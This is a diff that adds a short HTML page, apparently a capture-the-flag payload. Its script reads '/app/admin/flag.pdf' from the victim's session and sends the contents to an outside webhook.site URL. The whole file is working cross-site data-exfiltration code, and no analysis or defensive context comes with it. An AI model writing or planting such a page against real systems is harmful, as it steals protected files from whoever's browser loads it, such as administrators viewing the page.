@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>test</h1>
+    <script>
+      fetch("/app/admin/flag.pdf")
+        .then(r => r.text())
+        .then(flag => {
+          fetch("https://webhook.site/abcd1234-abcd-1234-efgh-5678ijklmnop?data=" + encodeURIComponent(flag));
+        });
+    </script>
+  </body>
+</html>
